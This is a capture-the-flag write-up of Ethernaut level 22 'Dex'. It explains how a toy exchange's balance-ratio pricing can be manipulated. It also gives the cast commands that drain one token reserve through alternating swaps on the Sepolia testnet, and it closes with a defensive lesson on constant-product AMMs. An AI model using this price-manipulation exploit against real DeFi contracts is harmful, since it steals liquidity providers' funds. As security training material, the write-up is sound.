# Ethernaut Challenge 22 — Dex

The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.

You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.

You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

---

## 🎯 Goal

Drain all of at least one of the two tokens from the DEX by exploiting the pricing logic.

---

## 🔍 Initial inspection

Instance address:

```bash
DEX_SEPOLIA=0x69222B1ac7950bEc5fc46cB377D7B92c2834fb7f
```

### Check `token1`

```bash
cast call $DEX_SEPOLIA \
    "token1()(address)" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:
`0xDA0d4bea0310335E5E770C1b7363d940029d49E4`

```bash
TOKEN1_SEPOLIA=0xDA0d4bea0310335E5E770C1b7363d940029d49E4
```

---

### Check `token2`

```bash
cast call $DEX_SEPOLIA \
    "token2()(address)" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:
`0x2790F6027caA0B33f0336b5dDA144f3B86Cd1C58`

```bash
TOKEN2_SEPOLIA=0x2790F6027caA0B33f0336b5dDA144f3B86Cd1C58
```

---

### Check player balances

```bash
MY_ADDRESS=0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0
```

```bash
cast call $DEX_SEPOLIA \
    "balanceOf(address,address)(uint256)" \
    $TOKEN1_SEPOLIA $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `10`

```bash
cast call $DEX_SEPOLIA \
    "balanceOf(address,address)(uint256)" \
    $TOKEN2_SEPOLIA $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `10`

---

### Check DEX balances

```bash
cast call $DEX_SEPOLIA \
    "balanceOf(address,address)(uint256)" \
    $TOKEN1_SEPOLIA $DEX_SEPOLIA \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `100`

```bash
cast call $DEX_SEPOLIA \
    "balanceOf(address,address)(uint256)" \
    $TOKEN2_SEPOLIA $DEX_SEPOLIA \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `100`

---

### Check owner

```bash
cast call $DEX_SEPOLIA \
    "owner()(address)" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:
`0xB468f8e42AC0fAe675B56bc6FDa9C0563B61A52F`

---

## 🧠 Vulnerability analysis

The swap formula is:

```text
amountOut = amount * (toBalance / fromBalance)
```

This is **NOT** constant product like Uniswap (`x * y = k`).

The price depends only on current balances, which you can manipulate.

We want to make the ratio:

```text
toBalance / fromBalance
```

very large.

---

## 🔁 Exploit strategy

To accomplish that, the idea is to **swap back and forth** the tokens so that one token balance gets drained.

Example:

1. Swap token1 → token2
2. Then token2 → token1
3. Repeat

Each time:

* one side decreases
* the other increases
* the ratio gets worse

---

## 🧪 Step-by-step example

Starting point:

```
DEX:
100 token1
100 token2

YOU:
10 token1
10 token2
```

Then:

```
1. swap 10 token1 → get 10 token2
   DEX = 110 / 90

2. swap 20 token2 → get 24 token1
   DEX = 86 / 110

3. swap 24 token1 → get 30 token2
   DEX = 110 / 80

4. swap 30 token2 → get 41 token1
   DEX = 69 / 110

5. swap 41 token1 → get 65 token2
   DEX = 110 / 45

6. swap 45 token2 → get 110 token1
   DEX = 0 / 90
```

---

### 🔍 What pattern should you notice?

The DEX keeps oscillating between shapes like:

* one reserve around 110
* the other reserve shrinking:
  `100 → 90 → 80 → 69 → ...`

More precisely:

* your balance increases every round
* each swap becomes more impactful
* one side eventually gets drained

---

## 🧪 Local test

We have created a local test file [DexTest.t.sol](../../test/challenge-22-dex/DexTest.t.sol) to simulate the exploit step by step.

---

## 🚀 Exploit on Sepolia

### 1. swap 10 token1 → get 10 token2

```bash
cast send $DEX_SEPOLIA \
    "approve(address,uint256)" \
    $DEX_SEPOLIA 10 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

```bash
cast send $DEX_SEPOLIA \
    "swap(address,address,uint256)" \
    $TOKEN1_SEPOLIA $TOKEN2_SEPOLIA 10 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

---

### Check balances

```bash
cast call $TOKEN1_SEPOLIA \
    "balanceOf(address)(uint256)" \
    $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `0` ✅

```bash
cast call $TOKEN2_SEPOLIA \
    "balanceOf(address)(uint256)" \
    $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `20` ✅

```bash
cast call $TOKEN1_SEPOLIA \
    "balanceOf(address)(uint256)" \
    $DEX_SEPOLIA \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `110` ✅

```bash
cast call $TOKEN2_SEPOLIA \
    "balanceOf(address)(uint256)" \
    $DEX_SEPOLIA \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `90` ✅

---

### 2. swap 20 token2 → get 24 token1

```bash
cast send $DEX_SEPOLIA \
    "approve(address,uint256)" \
    $DEX_SEPOLIA 20 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

```bash
cast send $DEX_SEPOLIA \
    "swap(address,address,uint256)" \
    $TOKEN2_SEPOLIA $TOKEN1_SEPOLIA 20 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

---

### Check balances

```bash
cast call $TOKEN1_SEPOLIA \
    "balanceOf(address)(uint256)" \
    $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `24` ✅

```bash
cast call $TOKEN2_SEPOLIA \
    "balanceOf(address)(uint256)" \
    $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `0` ✅

```bash
cast call $TOKEN1_SEPOLIA \
    "balanceOf(address)(uint256)" \
    $DEX_SEPOLIA \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `86` ✅

```bash
cast call $TOKEN2_SEPOLIA \
    "balanceOf(address)(uint256)" \
    $DEX_SEPOLIA \
    --rpc-url $SEPOLIA_RPC_URL
```

Result: `110` ✅

---

### 3 → 6 Repeat the same pattern

Continue alternating swaps:

* token1 → token2
* token2 → token1

until the DEX is drained.

---

## ✅ Final result

```bash
Token1 (DEX): 0
Token2 (DEX): 90
```

Challenge solved 🎉

---

## 🛡️ Security takeaway

* pricing based only on balances is unsafe
* lack of invariant makes the system manipulable
* repeated swaps can drain liquidity

A correct AMM (like Uniswap):

* uses `x * y = k`
* enforces slippage
* prevents this type of exploit

